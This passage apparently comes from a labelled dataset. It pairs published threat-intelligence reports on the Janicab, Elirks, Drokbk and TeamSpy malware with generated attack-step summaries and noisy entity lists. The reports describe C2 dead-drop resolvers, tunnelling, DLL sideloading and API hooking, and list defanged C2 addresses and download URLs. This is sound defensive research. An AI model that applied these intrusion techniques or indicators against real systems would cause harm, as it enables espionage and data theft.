\AppData\Local\Temp\ReplaceData\ for the keylogger kill switch command. An IPv4/IPv6 capable Python-based proxy that is able to relay web traffic between the local target system and remote C2 server. Support HTTP methods CONNECT, ‘OPTIONS’, ‘GET’, ‘HEAD’, ‘POST’, ‘PUT’, ‘DELETE’, ‘TRACE’ Local FTP Python-based server serving on port 2121 with creds test:test. Creates directory alias to all existing drives except floppy drive, using Junction.exe (a sysinternals tool). Adds regkey to accept EULA since it’s a sysinternal tool asking for EULA if it’s a first time run. Then serves the “junctioned” local directories to the FTP server. A Python script that takes four arguments: remote SSH server, remote SSH port, remote bind port, and “ftp” or “proxy” as application options. Depending on the argument received for the application option, it runs ftp.py (if ftp in argument) or pythonproxy.py (if proxy in argument). In both options, the script will start an SSH reverse tunnel to a remote server controlled by the threat actor and use the tunnel as a socks proxy or as a method to browse the local drives initialized previously with a local FTP server. If the killrunner.txt file is found in %temp%\ReplaceData\, runner.py will exit. It is a sysinternals tool url us/sysinternals/downloads/junction. It creates NTFS junction points (aliases); creates the “\\Drives” directory and maps it to the local FTP server created with ftp.py and serves its content. Known Windows-based CLI SSH client for pivoting and tunneling Referenced by Runner.py for reverse tunneling/file copying.PythonProxy.pyFtp.pyRunner.pyJunction.exePlink.exeInfrastructureOne of the distinctive features of Deathstalker is its use of DDRs/web services to host an encoded string that is later deciphered by the malware implant. We consistently see YouTube being used as a DDR despite other web service links existing in the malware settings and not being used, such as links to Google+, which was discontinued in April 2019.An interesting aspect we have noticed recently is the use of unlisted old YouTube links that were used in 2021 intrusions. Historically, an analyst can use search engines and YouTube search features to look up the pattern used in the respective web services. However, since the threat actor uses unlisted old YouTube links, the likelihood of finding the relevant links on YouTube is almost zero. This also effectively allows the threat actor to reuse C2 infrastructure.Interestingly, old and new Janicab variants are still using identical function declarations for the web services – YouTubeLinks, and continue to use a constant divider in the process of converting the decimal number to backend the C2 IP address. The most recent dividers we have seen in use are 1337 and 5362.As for the actual C2 IP addresses, we found that two IP addresses (87.120.254[.]100, 87.120.37[.]68) were hosted in the same ASN as the C2s used in PowerPepper intrusions (e.g., PowerPepper C2 87.120.37[.]192) and are based out of Bulgaria.7/14The protocol in use for C2 communication is HTTP with GET/POST methods, and the backend C2 software is PHP.IP 176.223.165[.]196 87.120.254[.]100 87.120.37[.]68Janicab version ASN 1.3.2 1.2.9a 1.1.247447 TTM – 23M GmbH 34224 NETERRA-AS – Neterra Ltd. 4224 NETERRA-AS – Neterra Ltd.Janicab 2021 listing of DDRsJanicab 2015 listing of DDRs8/14Sample unlisted YouTube DDR used in recent intrusionsWhile assessing one of the C2 servers, we discovered that the threat actor was hosting and calling an ICMP shell executable from victim machines. The ICMP shell tool named icmpxa.exe is based on an old Github project. The threat actor has compiled icmpsh-s.c (MD5 5F1A9913AEC43A61F0B3AD7B529B397E) while changing some of its content. The uniqueness of this executable (hash and filename), allowed us to pivot and gather other previously unknown C2 servers used by the threat actor. Interestingly, we also found that the same ICMP shell executable was used previously in PowerPepper intrusions, indicating a potential infrastructure overlap between the two malware families.Since Janicab is a VBS-based malware, C2 commands can be easily derived from the embedded functions. The malware makes use of VBS functions to connect to the C2 server over HTTP GET/POST requests, and to specific PHP pages. Each PHP page provides certain functionality. Since the early versions of Janicab, the PHP pages’ file name remained largely the same and indicates the backend/intended function. However, starting from version 1.1.x, the threat actor started shortening the PHP pages’ file name without changing much of the intended function. The table below summarizes the PHP pages, their old naming, and their potential use:9/14PHP page action=addrit.phpc.php rs.php rk.phpsm.phpd.phpOld name action=addReportIT.phpDescription Checks server status Receives beacon data from victim If this is a new victim, generates a user ID and registers system profile info in the C2 backend; adding a victim to the database Records if a user machine is related to an IT person after assessing if the machine has any of the anti- analysis checks. In old Janicab versions, a message is also sent as (“it guy”) Provides system commands for execution on the victim machineGetCLI.php ReceiveScreenshot.php Receives screenshot data from the victim Receives keylogger data from the victim ReceiveKl.php Provides the implant with a suitable method to start its execution flow based on available security controls Downloads saved files from C2 to victimStartup.php?data=N/AThe affected entities fall within the traditional sphere of Deathstalker targeting; primarily legal and financial investment management (FSI) institutions. However, we have also recorded a potentially new affected industry – travel agencies. The Middle East region and Europe were also seen as a typical workspace for Deathstalker with varying intensity between the countries. Interestingly, this is the first time we have noted legal entities in Saudi Arabia being targeted by this group.The countries affected by the Janicab intrusions we analyzed are Egypt, Georgia, Saudi Arabia, United Arab Emirates, and the United Kingdom. AttributionWe assess with high confidence that the intrusions discussed in this report are associated with the Deathstalker threat actor group. The attribution is based on the use of the new Janicab variant, unique TTPs, victimology, and infrastructure used by the threat actor operators. Comparative intrusion analysis of Janicab and Powersing highlights similarities in several phases of the cyber kill chain.In summary:Same SID and metadata for LNK droppers used in previous Deathstalker intrusions; Similar persistence mechanism between Janicab and Powersing using LNK in the startup folder; Janicab has a similar infection execution flow and uses interpreted-language toolsets such as VBS, VBE, and Python; Janicab macOS and Windows versions have Python file naming similar to EVILNUM malware (e.g., runner.py, serial.txt, etc.);EVILNUM runner.py for file transfer10/14Janicab 2021 runner.py snippet for file transferOld Janicab for MacOS runner.py for starting background service with file transfer capabilityThe use of Python-based toolset and libraries is common across all Deathstalker intrusions using Janicab, Powersing, EVILNUM, and PowerPepper; The use of YouTube, among other web services/DDRs, is common across Janicab and Powersing intrusions; the method of calling and parsing YouTube and the other DDRs for C2 IP address is almost identical in Janicab, Powersing, and EVILNUM; The identified C2 IPs fall within ASNs seen previously with PowerPepper intrusions; Diverse victimology with a focus on legal and financial institutions, possibly targeted by other hacker-for-hire threat groups; Based on our KTAE similarities engine, the dll (Stormwind) keylogger being used is over 90% similar to an older variant seen in previous Powersing intrusions; Identical code blocks in old/new Janicab and Powersing:Virtual machine detection through processes and virtual MAC addresses; the listing order for the MAC addresses are identical between both malware families, and even between the 2015 and 2021 Janicab versions; Almost identical anti-analysis process detection.11/14Janicab 2021 virtual MAC address listing ConclusionPowersing virtual MAC address listingJanicab is the oldest malware family being used by Deathstalker, dating back to 2013, and it is the least publicly known, perhaps because the associated operators have higher OPSEC standards in their practices than their counterparts operating EVILNUM and Powersing. Despite not much public information being available, the threat actor has kept developing and updating the malware code, updating the structure of the LNK droppers and switching the toolset to maintain stealthiness over a long period of time.Based on our telemetry, the threat actor remains focused on the Middle East and Europe as its main areas of operation, and shows a lot of interest in compromising legal and financial institutions. Despite that focus, we have historically seen the threat actor targeting other industries in rare situations; travel agencies are an example of this. This once again shows the threat actor is likely a hack-for-hire group with diverse motivation.Since the threat actor operators continue to use interpreted-language-based malware such as Python, VBE and VBS across their historical and recent intrusions, and largely within their malware families, this can be used to the defenders’ advantage since application whitelisting and OS hardening are effective12/14techniques to block the threat actor’s intrusion attempts. Defenders should also look for Internet Explorer processes running without GUI since Janicab is using IE in hidden mode to communicate with the C2. On the network, the threat actor’s use of a C2 IP address instead of domain names remains a prime method of bypassing DNS-based security controls. Instead, the threat actor is still using DDRs as the method to resolve the C2 IP address; an alternate technique for DNS resolution by using authentic, mostly allowed, public web services that allow C2 communication to blend in with legitimate traffic. This means network defenders can look for frequent visits to the DDR used, followed by HTTP sessions pointing to IP addresses instead of domain names. OutlookAs legal and financial institutions are a common target for this threat actor, we decided to provide a couple of hypotheses on the potential intent of the adversary (customer/operator). Perhaps it provides potential future victims who fall within the affected industries a head start in proactively preparing for such intrusions and/or updating their threat model.Summary of hypotheses for potential intent:H1: legal dispute that involves VIPs H2: legal dispute that involves financial assets H3: blackmailing VIPs H4: tracking financial assets of/for VIPs H5: competitive/business intelligence for medium/large companies H6: intelligence on medium/large mergers and acquisitionsHow to protect your organization against this threatThe detection logic has been improved in all our solutions to ensure that our customers remain protected. We continue to investigate this attack using our Threat Intelligence and we will add additional detection logic once they are required.Our products protect against this threat and detect it with the following names:HEUR:Trojan.WinLNK.Agent.gen Trojan.Win32.Agentb.jygp not-a-virus:HEUR:RiskTool.Win32.Screenshot.gen Trojan.Win32.Agent.xadvpb HEUR:Hacktool.Win32.ICMPShell.genIndicators of CompromiseNote: We provide an incomplete list of IoCs here that are valid at the time of publication. A full IoC list is available in our private report.File hashesJanicab13/1403CFA51AA7F0893F1D0FEB32B521CC61 SMPT-error.txt.lnkPost exploitationB5190D7CC4D7A59AD4962B8614DB8521 K.dll Keylogger B5450C8553DEF4996426AB46996B2E55 AD2195E2977BFB824C8AFDAB38E531B2 snapshot.dll (screenshot tool) 96EBCFB2CC9E6C5D0AD2CEC2522F1274 %user%:.dll (internal name: Screenshots.dll) 84AA12FE7C7AB241A2E0CA2DB5DB2865 snapshot.dll (UPX-packed version of 5F1A9913AEC43A61F0B3AD7B529B397E ICMP shellScreenshots.dll)plink.exeDDR Patterns“Dosen’t (typo by threat actor) matter how long you wait for the bus on a rainy day, (.*) seconds was enough to get wet?” “This is the (.*)th time this has happened to me” “our (.*)th psy anniversary”Domains and IPs176.223.165[.]196 87.120.254[.]100 87.120.37[.]68URLshxxp://<C2_ip_address>/d/icmpxa.exe | ICMPShell hxxp://<C2_ip_address>/d/unrar.exe | rar tool hxxp://<C2_ip_address>/d/procdump.exe | Sysinternals procdump hxxp://<C2_ip_address>/d/Rar.exe | rar tool hxxp://<C2_ip_address>:8080/api/icmp_kaspersky/icmpxa.exe | ICMPShell hxxp://<C2_ip_address>:8080/api/icmpxa.exe | ICMPShellDead-drop resolvershxxps[://]youtu[.]be/AApRxqOjLs4 hxxps[://]youtu[.]be/Tn7L5RyRAlM hxxps[://]youtu[.]be/aZRJQdwN4-g14/14 ","1. The threat actor sends a spearphishing email with a ZIP attachment containing a malicious LNK file. 2. The victim opens the LNK file, which triggers a chained execution flow: 3. The LNK runs a VBE loader script that drops and runs another VBE script. 4. The second VBE script extracts a CAB file containing Python scripts and libraries. 5. The CAB extracts and runs the Janicab VBScript implant. 6. Janicab sets persistence by adding a LNK file to startup and reaches out to the DDR to get the C2 IP. 7. Janicab receives commands from the C2 and can execute scripts, download files, capture screenshots and keystrokes, etc. 8. It uses Python scripts for proxying traffic, FTP serving local files, setting up SSH tunnels, etc. 9. A keylogger DLL is invoked to capture keystrokes and save them in encrypted log files. 10. The SSH tunnel is used to pivot into the network or exfiltrate data via the C2 server. ",valid_53,"['the threat actor', 'the victim', 'the LNK file', 'execution flow', 'VBE', 'second', 'Python', 'libraries', 'Janicab VBS', 'VBscript', 'persistence', 'the DDR', 'the C2 IP', 'commands', 'download files', 'screenshots', 'keystrokes', 'use', 'traffic', 'FTP', 'SSH', 'DLL', '10', 'pivot', 'the network', 'the C2 server']",the threat actor; the victim; the LNK file; execution flow; VBE; second; Python; libraries; Janicab VBS; VBscript; persistence; the DDR; the C2 IP; commands; download files; screenshots; keystrokes; use; traffic; FTP; SSH; DLL; 10; pivot; the network; the C2 server.
"0POSTED BY: Kaoru Hayashi on June 23, 2016 4:00 PMFILED IN: Cybersecurity, Threat Prevention, Unit 42 TAGGED: APAC, Elirks, Japan, PlugX, Scarlet MimicA recent, well-publicized attack on a Japanese business involved two malware families, PlugX and Elirks, that were found during the investigation. PlugX has been used in a number of attacks since first being discovered in 2012, and we have published several articles related to its use, including an analysis of an attack campaign targeting Japanese companies.Elirks, less widely known than PlugX, is a basic backdoor Trojan, first discovered in 2010, that is primarily used to steal information from compromised systems. We mostly observe attacks using Elirks occurring in East Asia. One of the unique features of the malware is that it retrieves its C2 address by accessing a pre-determined microblog service or SNS. Attackers create accounts on those services and post encoded IP addresses or the domain names of real C2 servers in advance of distributing the backdoor. We have seen multiple Elirks variants using Japanese blog services for the last couple of years. Figure 1 shows embedded URL in an Elirks sample found in early 2016.Figure 1 Embedded URLs in Elirks variantIn another sample found in 2014, an attacker used a Japanese blog service. The relevant account still exists at the time of writing this article (Figure 2).Figure 2 Blog account created by the attacker in 2014Link to previous attack campaignUnit 42 previously identified an Elirks variant during our analysis of the attack campaign called Scarlet Mimic. It is years-long campaign targeting minority rights activists and governments. TheGet Updates Sign up to receive the latest news, cyber threat intelligence and research from Unit 42.Business EmailSubmitSelect a CategorySelect a MonthMORE →Tech Docs: Simplify Firewall Management Using Template Stacks posted by Carl Mills on June 29, 2016 Prince of Persia – Game Over posted by Tomer Bar on June 28, 2016 William Saito: Industry 4.0, IoT and Security By Design posted by Chad Berndtson on June 27, 2016 Watch: CSO Insights from Infosecurity Europe 2016 posted by Richard Cashdan on June 27, 2016 Palo Alto Networks News of the Week –June 25, 2016 posted by Anna Lough on June 25, 2016MORE →malware primarily used in this series of attacks was FakeM. Our researchers described the threat sharing infrastructure with Elirks in the report.As of this writing, we can note similarities between previously seen Elirks attacks and this recent case in Japan.Spear Phishing Email with PDF attachmentFigure 3 shows an email which was sent to a ministry of Taiwan in May 2012.Figure 3 Spear Phishing Email sent to a ministry of TaiwanThe email characteristics were bit similar to the recent case (Table 1).Email Sender2012 Masquerades as an existing bank in TaiwanEmail Recipient Representative email address of a ministry of Taiwan, which is publicly available. “Bank credit card statement” in Chinese PDF file named “Electronic BillingAttachmentSubject2016 Masquerade as an existing aviation company in Japan Representative email address of a subsidiary company, which is publicly available. “Airline E-Ticket” in JapaneseFile named “E-TKT” in Japanese with PDF icon1015” in ChineseTable 1 Email characteristicsWhen a user opened the attached PDF file, the following message is displayed. It exploits a vulnerability in Adobe Flash, CVE-2011-0611 embedded in the PDF and installs Elirks malware on the system.Figure 4 opening malicious PDF attachmentAirline E-TicketAttackers choose a suitable file name to lure targeted individual or organization. In the recent case, the malicious attachment name in the email was reported as “E-TKT”. We found similar file name in the previous attack in Taiwan in August 2012 (Figure 5).Figure 5 Elirks executable file masquerade as folder of E-TicketWhen opening the file, Elirks executes itself on the computer and creates ticket.doc to deceiveusers (Figure 6).Figure 6 doc file created by ElirksWe’ve also seen another file name related to aviation at Taiwan in March 2012. Figure 7 shows PDF file named “Airline Reservation Numbers (updated version).pdf”. When opening the PDF file, it displays the exactly same message with the Figure4, exploits CVE-2011-0611 and installs Elirks.Figure 7 PDF named “Airline Reservation Number”Currently, we have found no reliable evidence to indicate the same adversary attacked a company in Japan in 2016 and multiple organizations in Taiwan in 2012. However, we can see some resemblances between the two attacks. In both cases, attackers used the same malware family, crafted spear phishing emails in a similar manner, and seem to be interested in some areas related to aviation. We have been seeing multiple Elirks variants targeting Japan in the last few years, potentially indicating an ongoing cyber espionage campaign. We will keep an eye on the threat actors.Palo Alto Networks customers are protected from Elirks variant and can gather additional ","1. The attacker sends a spear phishing email with a malicious PDF attachment. The PDF is made to look like an aviation-related document such as an e-ticket. 2. When the user opens the PDF attachment, it exploits a vulnerability like CVE-2011-0611. 3. The exploit installs the Elirks malware on the system. 4. Elirks then retrieves its C2 server address from accounts set up on predetermined microblog/social media services. 5. Elirks can then steal information from the compromised system. ",valid_39,"['the attacker', 'Spear Phishing Email', 'the PDF', 'aviation', 'an e', 'ticket', 'a vulnerability', 'CVE-2011-0611', 'Elirks', 'malware', 'the system', 'C2', 'accounts', 'information']",the attacker; Spear Phishing Email; the PDF; aviation; an e; ticket; a vulnerability; CVE-2011-0611; Elirks; malware; the system; C2; accounts; information.
"www.secureworks.com /blog/drokbk-malware-uses-github-as-dead-drop-resolver Drokbk Malware Uses GitHub as Dead Drop Resolver Counter Threat Unit Research Team ⋮ ⋮ 12/9/2022By: Counter Threat Unit Research TeamSecureworks® Counter Threat Unit™ (CTU) researchers are investigating the Drokbk malware, which is operated by a subgroup of the Iranian government-sponsored COBALT MIRAGE threat group. This subgroup is known as Cluster B. Drokbk is written in .NET and is made up of a dropper and a payload. The malware has limited built-in functionality and primarily executes additional commands or code from the command and control (C2) server. Early signs of its use in the wild appeared in a February 2022 intrusion at a U.S. local government network. A Drokbk malware sample was not available from that incident for analysis, but CTU™ researchers later discovered samples uploaded to the VirusTotal analysis service.Drokbk is deployed post-intrusion alongside other access mechanisms as an additional form of persistence within the victim's environment. COBALT MIRAGE's preferred form of remote access uses the Fast Reverse Proxy (FRPC) tool. While COBALT MIRAGE Cluster A uses a modified version of this tool known as TunnelFish, Cluster B favors the unaltered version. The only public mention of Drokbk.exe is in a March third-party report describing activity that exhibits signs of a Cluster B intrusion. In that instance, the malware used the C2 domain activate-microsoft . cf, which is known to be associated with Cluster B.The February intrusion that Secureworks incident responders investigated began with a compromise of a VMware Horizon server using two Log4j vulnerabilities (CVE-2021-44228 and CVE-2021-45046). Forensic artifacts indicated Drokbk.exe was extracted from a compressed archive (Drokbk.zip) hosted on the legitimate transfer . sh online service. The threat actors extracted the file to C:\Users\DomainAdmin\Desktop\ and then executed it.The Drokbk dropper checks for the existence of the c:\programdata\SoftwareDistribution directory and creates the directory if it does not exist. The dropper then writes all bytes from an internal resource to c:\users\public\pla. This is a temporary step; the extracted file (pla) is then copied to c:\programdata\SoftwareDistribution\SessionService.exe. Using this newly created file, the dropper adds the SessionManagerService service for persistence. Finally, the dropper deletes c:\users\public\pla. Figure 1 illustrates the installation process. CTU researchers have observed that the Cluster B operators favor c:\users\public\ as a directory used across multiple malware tools.1/4Figure 1. Process tree for Drokbk installation. (Source: Secureworks)SessionService.exe is the main malware payload, and it begins by finding its C2 domain. A C2 domain is often preconfigured in malware. However, Drokbk uses the dead drop resolver technique to determine its C2 server by connecting to a legitimate service on the internet (e.g., GitHub). The C2 server information is stored on a cloud service in an account that is either preconfigured in the malware or that can be deterministically located by the malware.Figure 2 shows decompiled .NET code from SessionService.exe. The binary uses the GitHub API to search for the 'mainrepositorytogeta' repository.Figure 2. DnSpy-decompiled .NET code from SessionService.exe. (Source: Secureworks)This code identifies the specific GitHub account and the request used to locate the malware's C2 server. The response is stored within the README.md file hosted on the GitHub account (see Figure 3). In this campaign, the threat actor used a GitHub account with the username Shinault23.Figure 3. Code used to locate the C2 server within a GitHub account. (Source: Secureworks)This approach gives the threat actors a degree of resiliency against shuttering of their GitHub account, as they can create a new account with a matching repository name. It also allows the malware to dynamically update its C2 server by repeating this process.The first commit to the README.md file occurred on June 9, 2022, suggesting this campaign began around this date. Between June 9 and July 13, the threat actors changed the C2 server multiple times. GitHub maintains a commit history for the file, listing each change (see Figure 4).2/4Figure 4. Example of the commit history for the Shinault23 account. (Source: Secureworks)Figure 5 lists the C2 servers configured between June 9 and July 13. These domain names and URL structures align with infrastructure patterns observed in other Cluster B activity, providing additional evidence supporting technical attribution.Figure 5. List of Drokbk C2 servers from the README.md file. (Source: Secureworks)Using the information from README.md, SessionService.exe sends an initial request to the C2 server. The request contains the hostname and current time (see Figure 6).Figure 6. Sandbox output showing initial Drokbk beacon. (Source: Secureworks)During execution, CTU researchers observed Drokbk creating the following files. No payloads or commands were received from the C2 during analysis.C:\Windows\Temp\v2ggla C:\Windows\Temp\vdoma434 C:\programdata\Interop ServicesTo mitigate exposure to this malware, CTU researchers recommend that organizations use available controls to review and restrict access using the indicators listed in Table 1. Note that IP addresses can be3/4reallocated. The domains, IP addresses, and URL may contain malicious content, so consider the risks before opening them in a browser.IndicatorTypeContextSHA1 Drokbk.exe malware 00519705 Drokbk.exe malware Drokbk.exe malware Drokbk.exe malware (SessionService.exe) Drokbk malware payload Drokbk malware payload MIRAGE Cluster B Fast Reverse Proxy used by COBALT MIRAGE Cluster B Fast Reverse Proxy used by COBALT MIRAGE Cluster B activate-microsoft.cf Drokbk C2 serverSHA1 hashDrokbk.exe malwareDrokbk C2 serverSHA1 IP address Hosts COBALT MIRAGE domain (oracle- IP address Drokbk C2 server URL Drokbk C2 server Domain Drokbk C2 server name universityofmhealth.biz ",1. Initial Compromise - Threat actors compromise VMware Horizon server using Log4j vulnerabilities. 2. Deploy Malware - Drokbk dropper and payload deployed on compromised server. - Dropper extracts Drokbk.zip archive hosting malware. 3. Install Malware - Dropper installs payload as SessionService.exe service for persistence. - Uses dead drop resolving technique to determine C2 server from GitHub. 4. Establish C2 - Payload sends initial beacon to C2 containing hostname and time. 5. Additional Actions - Malware creates temporary files locally. - No additional payloads or commands received from C2 during analysis. 6. Maintain Persistence - Malware configured to continue beaconing to C2 domains/IPs for ongoing access. - Threat actors update C2 info in GitHub README frequently. ,valid_88,"['VMware', 'Horizon server', 'Log4j vulnerabilities', 'Malware', 'payload', 'Drokbk.zip', 'SessionService.exe', 'persistence', 'dead drop', 'technique', 'C2 server', 'GitHub', 'hostname', 'time', 'commands', 'analysis', 'Figure', 'access']",VMware; Horizon server; Log4j vulnerabilities; Malware; payload; Drokbk.zip; SessionService.exe; persistence; dead drop; technique; C2 server; GitHub; hostname; time; commands; analysis; Figure; access.
"blog.avast.com /a-deeper-look-into-malware-abusing-teamviewer A deeper look into malware abusing TeamViewerJaromír Hořejší 13 Apr 2017Analyzing TeamSpy, malware that gives hackers complete remote control of PCs.TeamViewer, a remote control program, can be very handy when you need remote IT support. The cybercriminals behind TeamSpy, unfortunately, also find the tool to be quite useful and use it to carry out malicious activity.TeamSpy infects computers by tricking people into downloading a malicious attachment and enabling macros. After that, the malware secretly installs TeamViewer, giving the cybercriminals full control of the infected computer. TeamSpy first appeared back in 2013, which is when CrySyS Lab and Kaspersky Lab published white papers about its operation. Heimdal Security recently reported that the malware has resurfaced with a targeted spam campaign. We too have seen an uptick and have therefor decided to take a closer look. Hiding commands1/13Most malware communicates with a command and control (C&C) server after infecting a device. As the name suggests, a C&C server is the control center that sends out commands for malware to carry out. C&C servers are also where malware sends back the data it collects. For this communication, malware authors usually implement a custom protocol, which can be easily spotted and distinguished from other traffic and thus blocked by antivirus solutions. To make it more difficult for antivirus solutions to detect, some malware authors use popular remote control programs, like TeamViewer, instead to take advantage of their VPN network to better mask the communication between their malware and C&C servers. How TeamSpy infectsTeamSpy is spread via spam emails that are designed to trick people into opening an attachment. The attachment is an Excel file with macros. When the attachment is opened, the following screen appears:When the macros are enabled by the targeted person, the infection process begins, running completely in the background, so the victim doesn't notice anything. If we look inside the malicious macro, we can see slightly obfuscated strings, usually split into one or more substrings, which are later concatenated. The most important information is circled in red below and are a link, from which something is downloaded, and a password, which will be used later.2/13The link, disk.karelia.pro, is a legitimate Russian service for uploading and sharing files. Although the attachment of the downloaded is a PNG, it is actually an EXE file, more specifically it is an Inno Setup installer protected by the password.With the help of the innounp utility, we were able to easily list or extract the files from the Inno Setup installer used by the malware. As shown in the listing below, most of the files are regular, digitally signed TeamViewer binaries, with the exception of two files - msimg32.dll and tvr.cfg. Tvr.cfg is TeamSpy’s configuration file and will be described later, msimg32.dll is the malware itself. Msimg32.dll is a DLL library which is part of Windows OS. In this case, however, TeamSpy abuses the DLL search order, so that the fake msimg32.dll from the current directory is loaded into the process instead of the original msimg32.dll from Windows/System32 directory. The malware itself is in the fake msimg32.dll library.3/13TeamSpy’s invisibility cloakNormally when you install the TeamViewer, you see a GUI window with an ID and password, which the other party needs to know if they want to remotely connect to your computer.4/13If TeamSpy successfully infects a PC, nothing is shown - remember everything runs in the background, so that the victim doesn’t notice TeamViewer is installed. This is achieved by hooking many API functions and altering their behavior. TeamSpy hooks the following APIs (nearly 50 different APIs):kernel32.dllCreateMutexW, CreateDirectoryW, CreateFileW, CreateProcessW, GetVolumeInformationW, GetDriveTypeW, GetCommandLineW, GetCommandLineA, GetStartupInfoA, MoveFileExW, CreateMutexAuser32.dllSetWindowTextW, TrackPopupMenuEx, DrawTextExW, InvalidateRect, InvalidateRgn, RedrawWindow, SetWindowRgn, UpdateWindow, SetFocus, SetActiveWindow, SetForegroundWindow, MoveWindow, DialogBoxParamW, LoadIconW, SetWindowLongW, FindWindowW, SystemParametersInfoW, RegisterClassExW, CreateWindowExW, CreateDialogParamW, SetWindowPos, ShowWindow, GetLayeredWindowAttributes, SetLayeredWindowAttributes, IsWindowVisible, GetWindowRect, MessageBoxA, MessageBoxWadvapi32.dllRegCreateKeyW, RegCreateKeyExW, RegOpenKeyExW, CreateProcessAsUserW, CreateProcessWithLogonW, CreateProcessWithTokenW, Shell_NotifyIconW, ShellExecuteWiphlpapi.dllGetAdaptersInfoSome hooks block the application’s access to some specific resources, e.g. if RegCreateKey or RegOpenKey attempt to access the Software\TeamViewer registry key, the error code: ERROR_BADKEY is returned.5/13Hooking the GetCommandLine makes TeamViewer think that it was started with a predefined password (instead of a randomly generated password, TeamViewer users can normally set this password to an arbitrary value by adding a command line parameter)Hooking SetWindowLayeredAttributes sets the TeamViewer window opacity to 0 (instruction PUSH 0), which according to the MSDN documentation means the following: “When bAlpha is 0, the window is completely transparent. When bAlpha is 255, the window is opaque.”Hooking CreateDialogParam blocks some dialogs unwanted by the malware from even being created. These dialogs can be looked up in the file TeamViewer_Resource_en.dll, they are referenced with numbers like 10075, see the figure below.6/13In case of ShowWindow, it defines it’s own nCmdShow parameters 4d2h and 10e1h. If other values than these are passed, nothing happens.Probably the most interesting is the hooking of the CreateWindowEx API. Via a series of class name checks, it identifies a window and other window controls that belong to the TeamViewer chat window. With help of a tool like WinSpy++, we can see all the windows belonging to the particular process (even if they are hidden). As you can see from the figure below, there is a ControlWin window, which has several TVWidgets. One widget belongs to the chat - it has two ATL:???????? text edits, one for the chat message history and one for the new chat message, one combo box with a drop down list of chat participants and the button Send. “message 01” is the received message in the chat, “message 02” is7/13message which will be sent after clicking the “Send” button. The chat window cannot be normally seen, as the malware runs in the background, but it is possible to patch the malware, so that hiding windows does not happen.The code snippet below shows how the malware obtains handles to these window controls. GetWindowLong and CallWindowProc and SetWindowLong with nIndex = GWL_PROC replaces the old address for the window procedure of the chat history text edit with a custom window procedure.8/13The custom window procedure listens for incoming messages, and based on the window message id, it either sends a new message or it waits for a reply from the C&C server (EM_SETCHARFORMAT message arrived).The figure below shows how a new message is sent. Malware first sets focus to the new message text edit with WM_SETFOCUS, then it sets the new message edit text by WM_SETTEXT and at last it clicks on the “Send” button by sending BM_CLICK.Similar modifications are applied to most of the 50 APIs listed above. Some patches are very simple, having no more than a few instructions, while some patches are very complex, like CreateWindowEx. We will not list all of them here, however, the final effect is clear - TeamViewer’s windows are not displayed to the victim. They silently exist in the system and that’s all. Configuration fileTeamSpy’s configuration is stored in tvr.cfg file. It uses a simple custom encryption algorithm, which can be seen below. It reads the input file and uses the password “TeamViewer”. The algorithm runs two counters, cnt1 (0 number of bytes in tvr.cfg ) and cnt2 (0 length of the password). It takes a byte from the password, adds the result of the multiplication cnt1*cnt2. This is done for each character of the password. These results are all XORed, one character is produced, and at the end of the loop, it is XORed with the respective byte from the configuration file. These steps are repeated for all bytes in configuration file.9/13The decrypted configuration file can be seen below. The names of the parameters are mostly self explanatory. The most important for us are the password (infected machine has password “superpass” ) and server1, where the infected machine ID is exfiltrated.Phoning homeThe communication between the infected machine and the C&C server is established soon after the infection process starts. The following request is regularly sent. The names of most parameters can be clearly deduced.id = TeamViewer ID, cybercriminals need this id, which together with the password are enough to remotely connect to the infected computertout = timeout10/13idl = idle timeosbt = 32bit/64bitosv = OS versionosbd = OS build versionossp = service packtvrv = TeamViewer versionuname = user namecname = computer namevpn = has TeamViewer vpnavr = antivirus solutionWhen we open the C&C server in a web browser, we see the following login page: Chat controlThe infected computer is controlled via TeamViewer. Cybercriminals can connect to the remote computer (they know the ID and password for TeamViewer) or they can send commands via the TeamViewer chat, to basically do whatever they please on the infected machine. The communication via the TeamViewer chat allows for the basic backdoor functionalities to be performed: applist, wcmd, ver, os, vpn, locale, time, webcam, genid. Inside the TeamSpy code, these commands are compared to their crc32 checksums, so collisions can very easily happen. Because crc32(wcmd) = 07B182EB = crc32(aacvqdz), both of these commands are interchangeable.11/13Using TeamViewer’s legitimate VPN encrypts the traffic and makes it indistinguishable from legitimate TeamViewer traffic. Once the machine is infected, the criminals have full access to the computer. They can steal and exfiltrate sensitive data, download and execute arbitrary programs, and more.Abusing the legitimate application with sideloading is a clever technique, because not every user checks legitimacy of all the DLL libraries in the same directory. Checking the signature of the main executable does not reveal anything suspicious and may let the victim think that everything is alright. See the digital signature of the main update_w32.exe file below. This file is not malicious.12/13It is important to remember that there are more malware classes that abuse TeamViewer, not just TeamSpy. This blogpost just describes one of them. The principle is, however, similar in other malware classes.5.0 SHAsXLS with macrosFE7CA42EE57CEDAD4E539A01A1C38E22F3A4EDC197D95237E056AF02F252C739Password protected Inno InstallerAD377654518C19BE85FA6BF09570D8D1C8ABA52FFCD83061127851A2DAEF4858Fake msimg32.dll921FB1D6E783A6CA70BD1399EA5A18C78027D3016BEA6881F132A253F3C97ED66.0 and yes, we detect it13/13 ", 1. Spam emails with malicious Excel attachments are sent to potential victims. 2. The victim enables macros which starts the silent background installation of TeamViewer and the malware DLL. 3. The malware hooks APIs to hide TeamViewer and make it run silently. 4. It sends system info and TeamViewer ID to the C&C server. 5. The attackers connect remotely via TeamViewer using the ID and password. 6. They send commands via the chat to control the system and steal data. ,valid_45,"['spam emails', 'us', 'Excel', 'the victim', 'macros', 'the malware', 'DLL', 'APIs', 'Send', 'TeamViewer ID', 'the C&C server', 'the ID', 'password', 'commands', 'the chat', 'control', 'the system', 'data']",spam emails; us; Excel; the victim; macros; the malware; DLL; APIs; Send; TeamViewer ID; the C&C server; the ID; password; commands; the chat; control; the system; data.
